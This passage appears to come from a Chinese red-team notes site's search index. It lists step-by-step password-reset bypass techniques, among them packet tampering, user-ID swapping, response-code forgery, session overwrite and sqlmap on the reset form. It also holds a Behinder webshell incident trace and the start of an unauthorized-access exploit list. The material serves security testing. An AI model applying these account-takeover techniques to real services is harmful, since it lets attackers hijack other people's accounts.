\u5f00\u59cb\u7684\u5185\u5bb9\u66ff\u6362\u81f3\u6b63\u5e38\u6d41\u7a0b\u7684\u53d1\u751f\u9a8c\u8bc1\u7801\u5305\u5185\uff0c\u540c\u65f6\u66ff\u6362\u81ea\u5df1\u63a5\u53d7\u9a8c\u8bc1\u7801\u7684\u90ae\u7bb1\uff0c\u63d0\u4ea4 \u901a\u8fc7\u90ae\u7bb1\u83b7\u53d6\u9a8c\u8bc1\u7801\u540e\uff0c\u5c06\u9a8c\u8bc1\u7801\u3001Cookie\u3001\u4ed6\u4eba\u5e10\u53f7\u3001\u81ea\u5df1\u90ae\u7bb1\u66ff\u6362\u81f3\u9a8c\u8bc1\u9a8c\u8bc1\u7801\u6a21\u5757\uff0c\u63d0\u4ea4\uff08\u4e0d\u7528\u5728\u610f\u8fd4\u56de\u662f\u5426\u9519\u8bef\uff09 \u7ee7\u7eed\u66ff\u6362\u5185\u81f3\u83b7\u53d6 token \u6a21\u5757\uff0c\u63d0\u4ea4\u83b7\u53d6 token \u6700\u540e\u5c06\u83b7\u53d6\u7684 token \u548c\u4e0a\u9762\u7684\u5185\u5bb9\u66ff\u6362\u81f3\u6700\u540e\u7684\u91cd\u7f6e\u5bc6\u7801\u6a21\u5757\uff0c\u63d0\u4ea4\u6210\u529f\u4fee\u6539\u5bc6\u7801 \u4f8b\u5982\uff1a \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0c\u8bbf\u95ee\u94fe\u63a5\u91cd\u7f6e\u5bc6\u7801\uff0c\u8f93\u5165\u65b0\u5bc6\u7801\u540e\u63d0\u4ea4\u65f6\u6293\u5305\uff0c\u867d\u7136\u6709 token\uff0c\u4f46\u662f\u4f9d\u7136\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 \u7528\u6237ID \u8fdb\u800c\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801 \u4f8b\u5982\uff1a \u901a\u8fc7\u4ed6\u4eba\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u6293\u5305\uff0c\u5c06\u4ed6\u4eba\u624b\u673a\u53f7\u66ff\u6362\u6210\u81ea\u5df1\u7684\u624b\u673a\u53f7\uff0c\u83b7\u53d6\u9a8c\u8bc1\u7801\uff0c\u63d0\u4ea4\u540e\u4fee\u6539\u5bc6\u7801 \u901a\u8fc7\u81ea\u5df1\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u83b7\u53d6\u9a8c\u8bc1\u7801\u540e\u6293\u5305\uff0c\u5c06\u6570\u636e\u5305\u4e2d\u7684 username \u6539\u4e3a\u4ed6\u4eba\u7528\u6237\u540d\uff0c\u63d0\u4ea4\u540e\u6210\u529f\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801 \u77ed\u4fe1\u9a8c\u8bc1\u7801\u3001\u90ae\u7bb1 token\u3001\u91cd\u7f6e\u5bc6\u7801 token \u4f8b\u5982\uff1a \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0cURL \u94fe\u63a5\u4e2d\u4fee\u6539 \u7528\u6237ID \u4e3a\u4ed6\u4eba\uff0c\u90ae\u7bb1\u4e0d\u53d8\uff0c\u4e4b\u540e\u901a\u8fc7\u94fe\u63a5\u53ef\u4ee5\u5c06\u4ed6\u4eba\u8d26\u6237\u7ed1\u5b9a\u4e3a\u81ea\u5df1\u7684\u90ae\u7bb1\uff0c\u4e4b\u540e\u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801 \u4f8b\u5982\uff1a \u7ed9\u5df2\u77e5\u8d26\u6237\u7ed1\u5b9a\u624b\u673a\uff0c\u53d1\u73b0\u7ed1\u5b9a\u624b\u673a\u7684 URL \u94fe\u63a5\u4e2d\u6709 uid \u53c2\u6570\uff0c\u4fee\u6539 uid \u53c2\u6570\u4e3a\u4ed6\u4eba\u7684\uff0c\u5373\u53ef\u5b9e\u73b0\u5c06\u4ed6\u4eba\u7684\u8d26\u6237\u7ed1\u5b9a\u4e0a\u81ea\u5df1\u7684\u624b\u673a\uff0c\u4e4b\u540e\u901a\u8fc7\u624b\u673a\u6765\u4fee\u6539\u5bc6\u7801 \u4fee\u6539\u4e2a\u4eba\u8d44\u6599\u5904\u6293\u5305\uff0c\u4fee\u6539 userId \u4e3a\u4ed6\u4eba\uff0c\u4fee\u6539 mobilePhone \u4e3a\u81ea\u5df1\u7684\u624b\u673a\uff0c\u5373\u53ef\u5b9e\u73b0\u5c06\u4ed6\u4eba\u7684\u8d26\u6237\u7ed1\u5b9a\u4e0a\u81ea\u5df1\u7684\u624b\u673a\uff0c\u4e4b\u540e\u901a\u8fc7\u624b\u673a\u6765\u4fee\u6539\u5bc6\u7801 \u624b\u673a\u7ed1\u5b9a\u3001\u90ae\u7bb1\u7ed1\u5b9a \u4f8b\u5982\uff1a \u901a\u8fc7\u5bc6\u7801\u4fdd\u62a4\u95ee\u9898\u627e\u56de\u5bc6\u7801\uff0c\u6293\u5305\uff0c\u5c06\u5bc6\u7801\u4fdd\u62a4\u95ee\u9898\u5220\u9664\uff0c\u76f4\u63a5\u4fee\u6539\u5bc6\u7801\uff0c\u63d0\u4ea4 \u6ce8\uff1a\u6b64\u5904\u5bc6\u4fdd\u95ee\u9898\u548c\u65b0\u5bc6\u7801\u5728\u540c\u4e00\u9875\u9762 \u4f8b\u5982\uff1a \u6b63\u5e38\u6d41\u7a0b\uff0c\u901a\u8fc7\u624b\u673a\u53f7\u63d0\u4ea4\u9a8c\u8bc1\u7801\u627e\u56de\u5bc6\u7801\u5904\u6293\u5305\uff0c\u8bb0\u5f55\u4e0b\u8fd9\u4e2a\u5305\u7684\u5185\u5bb9 \u901a\u8fc7\u5df2\u77e5\u7528\u6237\u540d\u627e\u56de\u5bc6\u7801\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\u53ef\u4ee5\u53d1\u73b0\u7528\u6237\u5176\u4ed6\u4fe1\u606f\uff08\u6bd4\u5982\uff1a\u624b\u673a\u53f7\u3001\u90ae\u7bb1\uff09 \u901a\u8fc7\u53d1\u73b0\u7684\u624b\u673a\u53f7\u9009\u62e9\u901a\u8fc7\u624b\u673a\u627e\u56de\u5bc6\u7801\uff0c\u968f\u4fbf\u8f93\u5165\u77ed\u4fe1\u9a8c\u8bc1\u7801\uff0c\u6293\u5305 \u4fee\u6539\u4e4b\u524d\u8bb0\u5f55\u4e0b\u7684\u5305\u7684\u5185\u5bb9\uff0c\u5c06\u5176\u4e2d Session id\u3001\u7528\u6237ID \u4fee\u6539\u4e3a\u521a\u521a\u4ece\u5176\u4ed6\u7528\u6237\u540d\u6293\u5305\u83b7\u5f97\u7684\u5185\u5bb9\uff0c\u63d0\u4ea4\u8fd9\u4e2a\u5305\uff0c\u5373\u53ef\u6210\u529f\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801 \u6700\u7ec8\u63d0\u4ea4\u6b65\u9aa4 \u4f8b\u5982\uff1a \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0c\u6700\u540e\u901a\u8fc7\u94fe\u63a5\u81f3\u4fee\u6539\u5bc6\u7801\u9875\u9762\uff0c\u4fee\u6539\u5bc6\u7801\u540e\u63d0\u4ea4\uff0c\u6293\u5305\uff0c\u83b7\u5f97 Uid \u53c2\u6570\uff0c\u4fee\u6539\u4e3a\u4ed6\u4eba\uff0c\u5373\u53ef\u4fee\u6539\u5176\u4ed6\u7528\u6237\u5bc6\u7801 \u670d\u52a1\u5668\u9a8c\u8bc1\u7684\u9a8c\u8bc1\u903b\u8f91\u4e3a\u7a7a\uff08\u7ed5\u8fc7\u8ba4\u8bc1\uff09 \u4f8b\u5982\uff1a \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0c\u70b9\u51fb\u8bf7\u91cd\u65b0\u53d1\u9001\u90ae\u4ef6\u5904\u6293\u5305\uff0c\u5c06\u90ae\u7bb1\u6539\u4e3a\u81ea\u5df1\u7684\u90ae\u7bb1\uff0c\u901a\u8fc7\u94fe\u63a5\u6210\u529f\u4fee\u6539\u5bc6\u7801 \u4f8b\u5982\uff1a \u901a\u8fc7\u624b\u673a\u627e\u56de\u5bc6\u7801\uff0c\u8f93\u5165\u9a8c\u8bc1\u7801\u548c\u65b0\u7684\u5bc6\u7801\uff0cF12 \u5ba1\u67e5\u5143\u7d20\uff0c\u4fee\u6539\u81ea\u5df1\u7684\u624b\u673a\u4e3a\u4ed6\u4eba\u624b\u673a\uff0c\u63d0\u4ea4\u6210\u529f\u4fee\u6539\u4ed6\u4eba\u624b\u673a\uff08\u4e5f\u53ef\u4ee5\u6293\u5305\u4fee\u6539\uff09 \u4f8b\u5982\uff1a \u6b63\u5e38\u6d41\u7a0b\u4e0b\uff0c\u5bc6\u7801\u627e\u56de\uff0c\u67e5\u770b\u6700\u540e\u8bbe\u7f6e\u65b0\u5bc6\u7801\u9875\u9762\u7684 URL\uff0c\u8bb0\u5f55\u4e0b\u6765 \u7ee7\u7eed\u8fd4\u56de\u5bc6\u7801\u627e\u56de\u5904\uff0c\u8f93\u5165\u5176\u4ed6\u7528\u6237\u540d\uff0c\u63d0\u4ea4\u627e\u56de\u7533\u8bf7\uff0c\u76f4\u63a5\u8bbf\u95ee\u4e0a\u9762\u8bb0\u5f55\u4e0b\u7684\u4fee\u6539\u5bc6\u7801\u9875\u9762\uff0c\u6210\u529f\u4fee\u6539\u5bc6\u7801 \u4e5f\u53ef\u4ee5\u6b63\u5e38\u6d41\u7a0b\u4e0b\uff0c\u4fee\u6539\u5bc6\u7801\u9875\u9762\u6293\u5305\uff0c\u4fee\u6539\u5176\u4e2d\u7684 USERNAME_COOKIE \u4e3a\u5176\u4ed6\u7528\u6237\uff08\u6709\u53ef\u80fd\u4f1a\u7ecf\u8fc7\u7f16\u7801\uff0c\u6bd4\u5982 base64\uff09\uff0c\u63d0\u4ea4\u5373\u53ef\u4fee\u6539\u5176\u4ed6\u7528\u6237\u5bc6\u7801 \u5982\u679c\u6293\u5305\u5176\u4e2d\u6709 step \u53c2\u6570\uff0c\u53ef\u4ee5\u4fee\u6539\u8fd9\u4e2a\u53c2\u6570\u4e3a\u6700\u540e\u4e00\u6b65\uff08\u6bd4\u5982\uff1a5\uff09\uff0c\u63d0\u4ea4\u4fbf\u53ef\u7565\u8fc7\u4e4b\u524d\u7684\u6b65\u9aa4 \u8df3\u8fc7\u9a8c\u8bc1\u6b65\u9aa4\u3001\u627e\u56de\u65b9\u5f0f\u3001\u76f4\u63a5\u5230\u8bbe\u7f6e\u65b0\u5bc6\u7801\u9875\u9762 \u4f8b\u5982\uff1a \u901a\u8fc7\u7528\u6237\u540d\u627e\u56de\u5bc6\u7801\uff0c\u63d0\u4ea4\u540e\u4f1a\u81ea\u52a8\u53d1\u9001\u9a8c\u8bc1\u7801\u5230\u624b\u673a\u4e2d\uff0c\u6240\u4ee5\u6293\u5305\uff0c\u4fee\u6539\u624b\u673a\u4e3a\u81ea\u5df1\u7684\u624b\u673a\uff08\u5982\u679c\u5176\u4e2d\u6709 type \u4e4b\u7c7b\u7684\u53c2\u6570\uff0c\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\uff0c\u6709 email\u4e4b\u7c7b\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u5220\u9664\u5185\u5bb9\uff09 \u53d1\u9001\u4fee\u6539\u540e\u7684\u5305\uff0c\u624b\u673a\u6210\u529f\u63a5\u6536\u9a8c\u8bc1\u7801 \u8f93\u5165\u9a8c\u8bc1\u7801\uff0c\u7ee7\u7eed\u53d1\u9001\uff0c\u6293\u5305\uff0c\u5982\u679c\u6709 type \u4e4b\u7c7b\u7684\u53c2\u6570\uff0c\u53ef\u4ee5\u7ee7\u7eed\u5c1d\u8bd5\u4fee\u6539\uff0c\u53d1\u9001\u5c31\u53ef\u4ee5\u6210\u529f\u4fee\u6539\u5bc6\u7801 \u4f8b\u5982\uff1a \u901a\u8fc7\u624b\u673a\u627e\u56de\u5bc6\u7801\uff0c\u968f\u4fbf\u8f93\u5165\u9a8c\u8bc1\u7801\uff0c\u6293\u5305\uff0c\u53d1\u9001\uff0c\u62e6\u622a\u8fd4\u56de\u5305 \u4fee\u6539\u8fd4\u56de\u5305\u4e2d\u7684\u8fd4\u56de\u7801\uff0c\u7ee7\u7eed\u53d1\u9001\uff0c\u8bf4\u4e0d\u5b9a\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u76f4\u63a5\u8df3\u5230\u4fee\u6539\u5bc6\u7801\u7684\u9875\u9762 \u901a\u8fc7\u624b\u673a\u627e\u56de\u5bc6\u7801\uff0c\u6b63\u5e38\u6d41\u7a0b\u4e0b\u5230\u91cd\u7f6e\u5bc6\u7801\u9875\u9762\uff0c\u6293\u5305\u67e5\u770b\u8fd4\u56de\u6570\u636e\u4e2d\u6709\u4e00\u6bb5\u52a0\u5bc6\u5b57\u7b26\u4e32 \u5229\u7528\u4ed6\u4eba\u624b\u673a\u627e\u56de\u5bc6\u7801\uff0cURL \u8df3\u8f6c\u5230\u9a8c\u8bc1\u8eab\u4efd\u9875\u9762\uff0c\u94fe\u63a5\u4e2d\u5c31\u6709\u4e00\u6bb5\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0c\u8bb0\u5f55\u4e0b\uff0c\u968f\u4fbf\u8f93\u5165\u9a8c\u8bc1\u7801 \u6293\u5305\uff0c\u4fee\u6539\u5305\u4e2d\u6570\u636e\u4e3a\u6b63\u5e38\u6d41\u7a0b\u4e0b\u7684\u6570\u636e\uff0c\u66ff\u6362\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0cForward \u53d1\u9001\uff0c\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u9a8c\u8bc1\u7801\uff0c\u76f4\u63a5\u4fee\u6539\u5bc6\u7801 \u8f93\u5165\u7528\u6237\u540d\uff0c\u52a0\u4e2a\u5355\u5f15\u53f7\u62a5\u9519\uff0c\u8bf4\u660e\u53ef\u80fd\u5b58\u5728\u62a5\u9519\uff0c\u6293\u5305\uff0c\u4fdd\u5b58\u4e3a txt \u6587\u4ef6\uff0c\u5bfc\u5165 Sqlmap \u4e2d\u8dd1\u4e00\u904d \u627e\u56de\u5bc6\u7801\u5904\u5b58\u5728\u6ce8\u5165\u6f0f\u6d1e(\u89c1\u6846\u5c31\u00d7) \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0c\u6b63\u5e38\u6d41\u7a0b\u4e0b\uff0c\u6293\u5305\u67e5\u770b\u63d0\u4ea4\u9a8c\u8bc1\u7801\u540e\u8fd4\u56de\u7684\u6570\u636e\uff0c\u53d1\u73b0\u6709\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e2a\u52a0\u5bc6\u5b57\u7b26\u4e32\u548c\u540e\u9762\u91cd\u65b0\u8bbe\u7f6e\u65b0\u5bc6\u7801 URL \u94fe\u63a5\u4e2d\u7684\u52a0\u5bc6\u5b57\u7b26\u4e32\u4e00\u6837\uff0c\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u52a0\u5bc6\u5b57\u7b26\u4e32 \u6839\u636e\u4e0a\u9762\u63d0\u4ea4\u9a8c\u8bc1\u7801\u7684\u6293\u5305\uff0c\u4fee\u6539\u5176\u4e2d\u7684 User \u4e3a\u5176\u4ed6\u7528\u6237\uff08User \u6709\u53ef\u80fd\u4f1a\u4f7f\u7528 md5 \u52a0\u5bc6\uff09\uff0c\u53d1\u9001\uff0c\u5c31\u53ef\u4ee5\u8fd4\u56de\u5176\u4ed6\u7528\u6237\u7684\u52a0\u5bc6\u5b57\u7b26\u4e32 \u91cd\u65b0\u8fd4\u56de\u5230\u627e\u56de\u5bc6\u7801\u9996\u9875\uff0c\u5229\u7528\u5176\u4ed6\u7528\u6237\u627e\u56de\uff0c\u70b9\u4e0b\u4e00\u6b65\uff0c\u5230\u8f93\u5165\u9a8c\u8bc1\u7801\u5904\uff08\u4e5f\u6709\u53ef\u80fd\u9700\u8981\u70b9\u51fb\u53d1\u9001\u9a8c\u8bc1\u7801\uff09\uff0c\u76f4\u63a5\u4fee\u6539 URL \u94fe\u63a5\uff0c\u52a0\u5165\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u76f4\u63a5\u7ed5\u8fc7\u9a8c\u8bc1\u7801\uff0c\u91cd\u7f6e\u5bc6\u7801 session\u8986\u76d6\u6f0f\u6d1e \u6ce8\u518c\u91cd\u590d\u7684\u7528\u6237\u540d\uff0c\u4f8b\u5982 admin\uff0c\u76f8\u5f53\u4e8e\u4fee\u6539\u4e86\u5bc6\u7801 \u540c\u4e00\u6d4f\u89c8\u5668\uff0c\u9996\u5148\u8f93\u5165\u81ea\u5df1\u7684\u8d26\u6237\u8fdb\u884c\u90ae\u7bb1\u5bc6\u7801\u627e\u56de\uff0c\u8fdb\u5165\u90ae\u7bb1\u67e5\u770b\u94fe\u63a5\uff0c\u63a5\u7740\u8f93\u5165\u4ed6\u4eba\u8d26\u6237\uff0c\u8fdb\u884c\u5bc6\u7801\u627e\u56de\uff0c\u8fd4\u56de\u521a\u521a\u81ea\u5df1\u7684\u90ae\u7bb1\u70b9\u51fb\u94fe\u63a5\uff0c\u7531\u4e8e session \u8986\u76d6\u5bfc\u81f4\u4e86\uff0c\u8fd9\u4e2a\u94fe\u63a5\u6210\u4e3a\u4e86\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801\u7684\u94fe\u63a5\uff0c\u6210\u529f\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801 \u5c1d\u8bd5\u6b63\u5e38\u5bc6\u7801\u627e\u56de\u6d41\u7a0b \u9009\u62e9\u4e0d\u540c\u7684\u627e\u56de\u65b9\u5f0f\uff0c\u8bb0\u5f55\u6240\u6709\u6570\u636e\u5305 \u90ae\u7bb1\u627e\u56de\u5bc6\u7801 \u6839\u636e\u5bc6\u7801\u4fdd\u62a4\u95ee\u9898\u627e\u56de\u5bc6\u7801 \u6839\u636e\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801 \u5206\u6790\u6570\u636e\u5305\uff0c\u627e\u51fa\u654f\u611f\u90e8\u5206 \u5206\u6790\u540e\u53f0\u627e\u56de\u673a\u5236\u6240\u91c7\u7528\u7684\u9a8c\u8bc1\u624b\u6bb5 \u4fee\u6539\u6570\u636e\u5305\u8fdb\u884c\u9a8c\u8bc1\u662f\u5426\u5b58\u5728\u5bc6\u7801\u627e\u56de\u6f0f\u6d1e","title":"\u9a8c\u8bc1\u7801\u7ed5\u8fc7"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/","text":"\u653b\u51fb\u8005\u753b\u50cf\uff1a\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8 \u00b6 \u4e00\u3001\u4e8b\u4ef6\u63cf\u8ff0 \u00b6 \u53d1\u73b0\u653b\u51fb\u8005\u5c1d\u8bd5\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u3002\u51b0\u874e\u662f\u4e00\u6b3e\u4f7f\u7528\u52a0\u5bc6\u65b9\u5f0f\u8fde\u63a5\u540e\u95e8\u7a0b\u5e8f\u7684\u5ba2\u6237\u7aef\u5de5\u5177\u3002\u653b\u51fb\u8005\u6b63\u5728\u8fde\u63a5\u5e76\u8bbf\u95ee\u540e\u95e8\u7a0b\u5e8f\u3002 \u53d7\u5bb3\u4e3b\u673a\u53ef\u80fd\u5df2\u7ecf\u88ab\u690d\u5165\u540e\u95e8\u3001\u8fdc\u63a7\u6216\u6728\u9a6c\uff0c\u5bfc\u81f4\u53d7\u5bb3\u4e3b\u673a\u5df2\u7ecf\u6ca6\u9677\uff0c\u6210\u4e3a\u5080\u5121\u673a\u3002 \u4e8c\u3001\u884c\u4e3a\u5206\u6790 \u00b6 \u901a\u8fc7\u5bf9\u4f20\u8f93\u7684\u6570\u636e\u5305\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b1\u4e2a\u8d26\u53f7\u5b58\u5728\u5f31\u53e3\u4ee4\u767b\u5f55\u884c\u4e3a\u3002\u5929\u773c\u544a\u8b66\u4e2d\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u544a\u8b66 \u7ecf\u8fc7\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b\u4e24\u4e2a\u7f51\u7ad9\u5b58\u5728\u51b0\u874e\u540e\u95e8\uff1a xxx.xxx.org xxx.xxx.xxx.org:8080 \u5176\u4e2dxxx.xxx.org\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.org/apk/14/hf1t.jsp xxx.xxx.xxx.org:8080\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.xxx.org:8080/gd_interface/shell.jsp \u67e5\u8be2\u5929\u773c\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e5\u5bf9xxx.xxx.org\u4e0a\u4f20webshell\uff0c\u5e76\u6301\u7eed\u53d1\u8d77\u8fde\u63a5\u3002 \u8be5\u653b\u51fb\u8005\u66fe\u53d1\u8d77\u591a\u79cd\u653b\u51fb\u884c\u4e3a\uff0c\u6839\u636e\u544a\u8b66\u5206\u6790\u521d\u6b65\u63a8\u6d4b\u4e3a\u4f7f\u7528SQL\u6ce8\u5165\u8fdb\u5165\u7ba1\u7406\u540e\u53f0\u3002 \u5173\u8054\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e519\u65f6\u901a\u8fc7xxx.xxx.xxxx.org:8080/ajaxinvoke/frameworkModuleJob.processApkUpload.upload\u9875\u9762\u6210\u529f\u4e0a\u4f20webshell \u67e5\u770bxxx.xxx.xxx.org:8080\u76f8\u5173\u544a\u8b66\uff0c\u672a\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u884c\u4e3a\uff0c\u63a8\u6d4b\u4e3a\u5929\u773c\u4e0a\u67b6\u524d\u5df2\u88ab\u690d\u5165\u540e\u95e8\u3002 \u67e5\u770b\u5929\u773c\u76f8\u5173\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670815\u65e5\u8fdb\u884c\u8fde\u63a5\u540e\u95e8\u64cd\u4f5c\uff0c\u4e14\u672a\u8fdb\u884c\u5176\u4ed6\u7f51\u7edc\u4ea4\u4e92\u3002 \u4e09\u3001\u5f71\u54cd\u5206\u6790 \u00b6 \u653b\u51fbIP\u5217\u8868 \u00b6 10.2.84.115 \u53d7\u5bb3IP\u5217\u8868 \u00b6 10.2.84.115 \u56db\u3001\u5904\u7f6e\u5efa\u8bae \u00b6 \u53ca\u65f6\u6e05\u9664\u53d1\u73b0\u7684 webshell \u540e\u95e8\u3001\u6076\u610f\u6728\u9a6c\u6587\u4ef6\u3001\u6316\u77ff\u7a0b\u5e8f\u3002\u5728\u4e0d\u5f71\u54cd\u7cfb\u7edf\u6b63\u5e38\u8fd0\u884c\u7684\u524d\u63d0\u4e0b\uff0c\u5efa\u8bae\u91cd\u65b0\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u91cd\u65b0\u90e8\u7f72\u5e94\u7528\uff0c\u4ee5\u4fdd\u8bc1\u6076\u610f\u7a0b\u5e8f\u88ab\u5f7b\u5e95\u6e05\u7406\u3002","title":"\u6eaf\u6e90\u5206\u6790"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#webshell","text":"","title":"\u653b\u51fb\u8005\u753b\u50cf\uff1a\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_1","text":"\u53d1\u73b0\u653b\u51fb\u8005\u5c1d\u8bd5\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u3002\u51b0\u874e\u662f\u4e00\u6b3e\u4f7f\u7528\u52a0\u5bc6\u65b9\u5f0f\u8fde\u63a5\u540e\u95e8\u7a0b\u5e8f\u7684\u5ba2\u6237\u7aef\u5de5\u5177\u3002\u653b\u51fb\u8005\u6b63\u5728\u8fde\u63a5\u5e76\u8bbf\u95ee\u540e\u95e8\u7a0b\u5e8f\u3002 \u53d7\u5bb3\u4e3b\u673a\u53ef\u80fd\u5df2\u7ecf\u88ab\u690d\u5165\u540e\u95e8\u3001\u8fdc\u63a7\u6216\u6728\u9a6c\uff0c\u5bfc\u81f4\u53d7\u5bb3\u4e3b\u673a\u5df2\u7ecf\u6ca6\u9677\uff0c\u6210\u4e3a\u5080\u5121\u673a\u3002","title":"\u4e00\u3001\u4e8b\u4ef6\u63cf\u8ff0"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_2","text":"\u901a\u8fc7\u5bf9\u4f20\u8f93\u7684\u6570\u636e\u5305\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b1\u4e2a\u8d26\u53f7\u5b58\u5728\u5f31\u53e3\u4ee4\u767b\u5f55\u884c\u4e3a\u3002\u5929\u773c\u544a\u8b66\u4e2d\u53d1\u73b0\u5229\u7528\u51b0\u874eWebshell\u5de5\u5177\u8fde\u63a5\u540e\u95e8\u544a\u8b66 \u7ecf\u8fc7\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u4ee5\u4e0b\u4e24\u4e2a\u7f51\u7ad9\u5b58\u5728\u51b0\u874e\u540e\u95e8\uff1a xxx.xxx.org xxx.xxx.xxx.org:8080 \u5176\u4e2dxxx.xxx.org\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.org/apk/14/hf1t.jsp xxx.xxx.xxx.org:8080\u7684webshell\u5730\u5740\u4e3a\uff1a xxx.xxx.xxx.org:8080/gd_interface/shell.jsp \u67e5\u8be2\u5929\u773c\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e5\u5bf9xxx.xxx.org\u4e0a\u4f20webshell\uff0c\u5e76\u6301\u7eed\u53d1\u8d77\u8fde\u63a5\u3002 \u8be5\u653b\u51fb\u8005\u66fe\u53d1\u8d77\u591a\u79cd\u653b\u51fb\u884c\u4e3a\uff0c\u6839\u636e\u544a\u8b66\u5206\u6790\u521d\u6b65\u63a8\u6d4b\u4e3a\u4f7f\u7528SQL\u6ce8\u5165\u8fdb\u5165\u7ba1\u7406\u540e\u53f0\u3002 \u5173\u8054\u5929\u773c\u544a\u8b66\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670812\u65e519\u65f6\u901a\u8fc7xxx.xxx.xxxx.org:8080/ajaxinvoke/frameworkModuleJob.processApkUpload.upload\u9875\u9762\u6210\u529f\u4e0a\u4f20webshell \u67e5\u770bxxx.xxx.xxx.org:8080\u76f8\u5173\u544a\u8b66\uff0c\u672a\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u884c\u4e3a\uff0c\u63a8\u6d4b\u4e3a\u5929\u773c\u4e0a\u67b6\u524d\u5df2\u88ab\u690d\u5165\u540e\u95e8\u3002 \u67e5\u770b\u5929\u773c\u76f8\u5173\u65e5\u5fd7\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4e8e9\u670815\u65e5\u8fdb\u884c\u8fde\u63a5\u540e\u95e8\u64cd\u4f5c\uff0c\u4e14\u672a\u8fdb\u884c\u5176\u4ed6\u7f51\u7edc\u4ea4\u4e92\u3002","title":"\u4e8c\u3001\u884c\u4e3a\u5206\u6790"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_3","text":"","title":"\u4e09\u3001\u5f71\u54cd\u5206\u6790"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#ip","text":"10.2.84.115","title":"\u653b\u51fbIP\u5217\u8868"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#ip_1","text":"10.2.84.115","title":"\u53d7\u5bb3IP\u5217\u8868"},{"location":"redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/#_4","text":"\u53ca\u65f6\u6e05\u9664\u53d1\u73b0\u7684 webshell \u540e\u95e8\u3001\u6076\u610f\u6728\u9a6c\u6587\u4ef6\u3001\u6316\u77ff\u7a0b\u5e8f\u3002\u5728\u4e0d\u5f71\u54cd\u7cfb\u7edf\u6b63\u5e38\u8fd0\u884c\u7684\u524d\u63d0\u4e0b\uff0c\u5efa\u8bae\u91cd\u65b0\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u91cd\u65b0\u90e8\u7f72\u5e94\u7528\uff0c\u4ee5\u4fdd\u8bc1\u6076\u610f\u7a0b\u5e8f\u88ab\u5f7b\u5e95\u6e05\u7406\u3002","title":"\u56db\u3001\u5904\u7f6e\u5efa\u8bae"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/","text":"\u65e5\u5e38exp \u672a\u6388\u6743\u8bbf\u95ee \u00b6 l redis\u672a\u6388\u6743\u8bbf\u95ee l memcache\u672a\u6388\u6743\u8bbf\u95ee l docker\u672a\u6388\u6743\u8bbf\u95ee l k8s\u672a\u6388\u6743\u8bbf\u95ee , \u7206\u7834 